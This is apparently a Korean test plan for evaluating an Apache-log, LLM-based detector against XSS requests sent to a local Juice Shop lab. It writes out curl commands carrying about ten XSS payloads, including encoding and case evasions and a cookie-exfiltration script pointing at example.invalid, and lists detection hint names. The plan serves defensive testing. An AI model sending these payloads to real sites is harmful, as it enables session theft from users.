# 98B_C세트_비교실험

- 작성 기준일: 2026-04-25
- 문서 역할: `docs/98_비교_실험_요청_세트_표준.md`를 따르는 C세트(XSS) 비교 실험 초안
- 적용 범위: Juice Shop 기준 XSS 요청 세트
- 기준 데이터: Apache security/access/error 로그 표면 지표
- 실험 목적:
  1. 인코딩된 XSS 페이로드를 전처리/LLM이 어느 정도 복원해 해석하는지 확인한다.
  2. 단순 XSS 키워드 탐지를 넘어 쿠키 접근, 외부 전송 시도 등 위협 의도를 구분하는지 확인한다.
  3. 교육용 검색/튜토리얼 검색과 실제 공격 구조를 구분하는지 확인한다.

> 주의: 이 문서는 실행 문서 초안이다. 실제 실험은 승인된 로컬 Juice Shop 환경에서만 수행한다. Apache 로그만으로는 브라우저 내 스크립트 실행 여부, 쿠키 탈취 성공 여부, response body 반영 여부를 확정하지 않는다.

## 1. 기본 변수 및 환경

### 1.1 대상 환경

| 항목 | 값 |
|---|---|
| 대상 서비스 | Juice Shop |
| 기본 URL | `http://192.168.56.105` |
| 주요 endpoint | `/rest/products/search` |
| 주요 파라미터 | `q` |
| UA prefix | `lab-c-set-xss` |
| 실험 방식 | CLI-only, `curl` 기준 |

예시 변수:

```bash
export JUICE_URL="http://192.168.56.105"
export UA_PREFIX="lab-c-set-xss"
```

### 1.2 분석 축

C세트는 아래 세 축을 본다.

| 분석 축 | 설명 |
|---|---|
| Reconstruction | URL encoding, double encoding, HTML entity 등을 복원해 원래 의도를 읽는지 확인 |
| Impact Analysis | `document.cookie`, `location`, 외부 전송 시도 등 피해 가능성을 구체적으로 설명하는지 확인 |
| Evasion Detection | event handler, JS protocol, mixed case, entity encoding 같은 XSS 우회 기법을 식별하는지 확인 |
| False Positive Suppression | 교육용/튜토리얼 검색을 실제 공격으로 단정하지 않는지 확인 |

### 1.3 Apache 로그 기반 한계

이 실험의 판정은 Apache 로그 표면 지표에 한정한다.

직접 확인 가능한 것:

- `query_string`
- `raw_request_target`
- `status_code`
- `response_body_bytes`
- `resp_content_type`
- `duration_us`, `ttfb_us`
- `user_agent`
- `request_id`, `error_link_id`

직접 확인할 수 없는 것:

- 브라우저에서 스크립트가 실제 실행됐는지 여부
- 응답 HTML/JSON body 내부에 payload가 반영됐는지 여부
- 실제 쿠키 탈취 성공 여부
- 외부 서버로 데이터가 전송됐는지 여부
- DOM sink 도달 여부

따라서 보고서에서는 다음처럼 표현한다.

- 가능: “XSS payload가 query string에 관찰됨”
- 가능: “document.cookie 접근 의도가 있는 payload가 관찰됨”
- 가능: “외부 전송을 시도하는 형태의 문자열이 관찰됨”
- 불가: “쿠키 탈취 성공”
- 불가: “브라우저 실행 성공”
- 불가: “사용자 세션 탈취 확정”

### 1.4 curl 인코딩 깊이 주의

C세트는 인코딩 복원 능력을 보는 실험이므로, `curl --data-urlencode` 사용 방식에 따라 Apache 로그에 남는 인코딩 깊이가 달라진다.

원칙:

- 원문 payload를 `--data-urlencode`에 넣으면 Apache raw request에는 1회 URL-encoded 형태가 남는다.
- 이미 `%3C...%3E`처럼 인코딩된 문자열을 `--data-urlencode`에 넣으면 `%`가 다시 인코딩되어 2회 URL-encoded 형태가 남는다.
- 이미 `%253C...%253E`처럼 이중 인코딩된 문자열을 `--data-urlencode`에 넣으면 실제 로그에는 3회 이상 인코딩된 형태가 남을 수 있다.

따라서 C-02와 C-04는 아래처럼 실행한다.

| 항목 | `--data-urlencode`에 넣는 값 | Apache raw request 기대 형태 |
|---|---|---|
| C-02 URL Encoded | 원문 `<script>alert(document.cookie)</script>` | `%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E` 수준 |
| C-04 Double Encoded | 1회 인코딩된 `%3Cscript%3Ealert(1)%3C/script%3E` | `%253Cscript%253Ealert(1)%253C%2Fscript%253E` 수준 |

이미 실행한 산출물에서 C-02/C-04가 의도보다 한 단계 더 깊게 인코딩되어 보이면, 이는 분석 실패가 아니라 실행 옵션에 따른 encoding depth 차이로 따로 기록한다.

## 2. Round 1 — Core XSS / Encoding Reconstruction

Round 1은 기본 XSS 구조와 encoding 복원 여부를 확인한다.

### 2.1 C-01 Basic Script Tag

목적:

- `<script>` 기반 기본 XSS payload 인식 여부를 본다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-core-basic-script-1" \
  --data-urlencode "q=<script>alert('XSS')</script>" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- `query_string` 또는 `raw_request_target`에 script tag가 남는지 확인
- Stage1이 `xss` 또는 `suspicious_xss` 계열로 분류하는지 확인
- 단, 실행 성공 여부는 Apache 로그만으로 단정하지 않는다.

### 2.2 C-02 URL Encoded Script / Cookie Access

목적:

- URL encoded XSS payload를 복원해 `document.cookie` 접근 의도를 설명하는지 본다.
- 실제 실행에서는 원문 payload를 `--data-urlencode`에 넣어 Apache 로그에 1회 URL-encoded 형태가 남도록 한다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-core-urlenc-cookie-1" \
  --data-urlencode "q=<script>alert(document.cookie)</script>" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- `%3Cscript%3E...%3C/script%3E`를 `<script>...</script>`로 해석하는지 확인
- `document.cookie`가 쿠키 접근 의도임을 설명하는지 확인
- “쿠키 탈취 성공”이 아니라 “쿠키 접근 의도”로 표현한다.

### 2.3 C-03 Event Handler / Attribute Injection

목적:

- 속성 탈출과 event handler 주입을 XSS 우회 기법으로 인식하는지 본다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-core-event-onerror-1" \
  --data-urlencode "q=x\" onerror=\"alert(1)" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- `onerror` event handler를 XSS 실행 트리거 후보로 인식하는지 확인
- attribute injection 또는 event handler injection으로 설명하는지 확인
- 실제 DOM 반영/실행 여부는 Apache 로그만으로 단정하지 않는다.

### 2.4 C-04 Double Encoded Script

목적:

- double URL encoding을 2단계 decode하여 `<script>alert(1)</script>` 의도를 복원하는지 본다.
- 실제 실행에서는 1회 인코딩된 payload를 `--data-urlencode`에 넣어 Apache 로그에 2회 URL-encoded 형태가 남도록 한다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-core-double-enc-script-1" \
  --data-urlencode "q=%3Cscript%3Ealert(1)%3C/script%3E" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- 1회 decode: `%3Cscript%3Ealert(1)%3C/script%3E`
- 2회 decode: `<script>alert(1)</script>`
- prepare reason_hints에 decoded depth 또는 double decoded payload 관련 근거가 붙는지 확인
- provider가 원문 복원 과정을 보고서에 설명하는지 확인

### 2.5 C-05 Cookie Exfiltration Intent / Safe Sink

목적:

- 외부 전송 형태의 XSS payload를 단순 XSS가 아니라 쿠키 정보 유출 의도로 설명하는지 본다.

주의:

- 실제 외부 공격 도메인을 사용하지 않는다.
- public repo 문서에서는 `attacker.com` 같은 실제 소유 불명 도메인 대신 `example.invalid`를 사용한다.
- 이 실험은 문자열 의도 분석용이며, 실제 네트워크 전송 성공을 확인하지 않는다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-core-cookie-exfil-intent-1" \
  --data-urlencode "q=<script>document.location='http://example.invalid/collect?c='+document.cookie</script>" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- `document.location`과 `document.cookie` 조합을 정보 외부 전송 의도로 설명하는지 확인
- “외부 서버로 세션/쿠키 정보 전송을 시도하는 형태”라고 표현
- 실제 전송 성공 또는 데이터 유출 확정으로 쓰지 않는다.

## 3. Round 2 — Evasion / Entity / False Positive

Round 2는 우회 기법과 오탐 억제를 본다.

### 3.1 C-06 JavaScript Protocol

목적:

- 태그가 없어도 `javascript:` protocol이 XSS sink에서 실행될 수 있는 위험 문자열임을 인식하는지 본다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-adv-js-protocol-1" \
  --data-urlencode "q=javascript:alert('XSS')" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- `javascript:` protocol을 XSS 관련 위험 패턴으로 식별
- 단, 검색 파라미터에 문자열로만 존재하는 경우 실행 가능성은 별도 검증 필요로 기록

### 3.2 C-07 Mixed Case Script Tag

목적:

- 대소문자 혼합으로 필터 회피를 시도하는 script tag를 인식하는지 본다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-adv-mixedcase-script-1" \
  --data-urlencode "q=<sCrIpT>prompt(1)</sCrIpT>" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- `<sCrIpT>`를 `<script>`와 동등한 의미로 정규화해 해석하는지 확인
- case mixing evasion으로 설명하는지 확인

### 3.3 C-08 HTML Entity Encoded Script

목적:

- HTML entity encoding을 복원해 script tag 의도를 읽는지 본다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-adv-html-entity-script-1" \
  --data-urlencode "q=&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- `&#x3C;`를 `<`, `&#x3E;`를 `>`로 해석하는지 확인
- HTML entity encoded XSS로 설명하는지 확인
- `&#xNN;` 안의 `#` 문자를 SQL comment marker로 과잉 해석하지 않는지 확인
- 현재 prepare가 HTML entity decode를 지원하지 않으면 후속 개선점으로 기록한다.

### 3.4 C-09 FP Bait 1 — Educational Script Search

목적:

- 교육용 자연어 검색과 실제 XSS 공격 구조를 구분하는지 본다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-fp-edu-script-1" \
  --data-urlencode "q=how to prevent <script> alert in javascript" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- 자연어 문맥(`how to prevent`, `javascript`)을 고려하는지 확인
- 공격 구조가 약하면 `benign`, `likely_false_positive`, `low confidence` 등으로 낮추는지 확인
- 단순 `<script>` 키워드만으로 high severity XSS로 단정하면 오탐 실패로 기록한다.

### 3.5 C-10 FP Bait 2 — Event Handler Tutorial Search

목적:

- event handler 관련 튜토리얼 검색과 실제 attribute injection을 구분하는지 본다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-fp-edu-onerror-1" \
  --data-urlencode "q=tutorial for onerror event handler" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- `tutorial` 자연어 문맥을 고려하는지 확인
- 실제 quote breakout, attribute injection, tag context가 없으면 낮은 위험도로 분리하는지 확인
- prepare 단계에서 filtered out되는 경우, “LLM이 낮춘 것”이 아니라 “전처리가 후보에서 제외한 것”으로 구분해 기록한다.
- FP bait의 LLM 판단 자체를 평가하려면 후속으로 `false_positive_review_candidates` 같은 별도 보존 구조를 검토한다.

## 5. 평가 기준

### 5.1 Reconstruction 평가

| 항목 | 성공 기준 | 보완 기준 |
|---|---|---|
| URL encoded XSS | `%3Cscript%3E`를 `<script>`로 복원해 설명 | 인코딩 문자열만 언급하고 원본 의미를 설명하지 못함 |
| Double encoded XSS | depth 2 decode 후 `<script>` 의도를 설명 | 1회 decode 단계에서 멈춤 |
| HTML entity XSS | `&#x3C;` / `&#x3E;`를 `<` / `>`로 해석 | entity encoding을 일반 문자열로만 처리 |
| Mixed case XSS | `<sCrIpT>`를 `<script>`와 같은 의미로 해석 | 대소문자 차이 때문에 놓침 |

### 5.2 Impact 평가

| 항목 | 성공 기준 | 주의 |
|---|---|---|
| `alert(1)` | 테스트/PoC성 XSS로 분류 | 실제 피해는 낮게 표현 |
| `document.cookie` | 쿠키 접근 의도로 설명 | 쿠키 탈취 성공으로 단정하지 않음 |
| `document.location` + external URL | 외부 전송 의도로 설명 | 실제 외부 전송 성공으로 단정하지 않음 |
| `javascript:` | XSS sink에서 위험할 수 있는 protocol로 설명 | 현재 context에서 실행 가능 여부는 별도 검증 필요 |

### 5.3 False Positive 평가

| 항목 | 기대 판정 | 실패 판정 | 해석 주의 |
|---|---|---|---|
| C-09 educational script search | benign / likely_false_positive / low confidence | high severity XSS 단정 | Stage1에 올라간 경우 LLM 판정 평가 가능 |
| C-10 event handler tutorial | benign / likely_false_positive / low confidence | event handler 키워드만으로 공격 단정 | filtered out이면 prepare 단계의 오탐 억제 성공으로만 기록 |

## 7. 후속 코드 개선 검토 항목

이번 문서는 실행 초안이며 코드 수정 지시 문서가 아니다. 다만 C세트 결과에 따라 다음 개선을 검토할 수 있다.

1. HTML entity decode view 추가
   - `&#x3C;script&#x3E;`를 `<script>`로 복원하는 분석용 view를 추가한다.
   - 원본 `query_string`과 `raw_request_target`은 절대 덮어쓰지 않는다.

2. HTML entity와 SQL comment marker 오탐 분리
   - `&#xNN;`, `&#NN;` 내부의 `#`는 SQL comment marker로 보지 않는다.
   - `sqli:sql_comment` hint가 HTML entity 때문에 붙지 않도록 조정한다.

3. XSS hint 세분화
   - `xss:event_handler:onerror`
   - `xss:javascript_protocol`
   - `xss:html_entity_encoded`
   - `xss:mixed_case_tag`
   - `xss:browser_data_access:document_cookie`
   - `xss:external_navigation_or_exfil_intent`

4. FP bait 보존 구조 검토
   - C-10처럼 prepare에서 filtered out되는 교육용 검색은 pipeline 관점에서는 성공이다.
   - 다만 LLM의 FP 판단력을 평가하려면 `false_positive_review_candidates` 또는 `supporting_events`에 별도 보존하는 구조를 검토한다.

5. Stage2 프롬프트 보수화
   - `500 text/html`은 처리 오류 정황이지 XSS 실행 성공 근거가 아님을 명시한다.
   - `200 application/json`도 브라우저 실행 성공 근거가 아님을 명시한다.

## 8. 안전 및 해석 유의사항

- 모든 요청은 승인된 로컬 Juice Shop 환경에서만 수행한다.
- 외부 시스템을 대상으로 실행하지 않는다.
- C-05는 실제 외부 공격 도메인을 사용하지 않고 `example.invalid` 같은 비실제 도메인을 사용한다.
- Apache 로그에 payload가 남는 것과 브라우저에서 payload가 실행되는 것은 다르다.
- XSS payload가 관찰되어도 response body 반영 여부나 DOM 실행 여부는 별도 브라우저/애플리케이션 검증 없이는 확정하지 않는다.
- 보고서에서는 “실행 성공”, “쿠키 탈취 성공”, “세션 하이재킹 성공” 같은 표현을 피하고, “그러한 의도의 payload가 관찰됨”으로 기록한다.
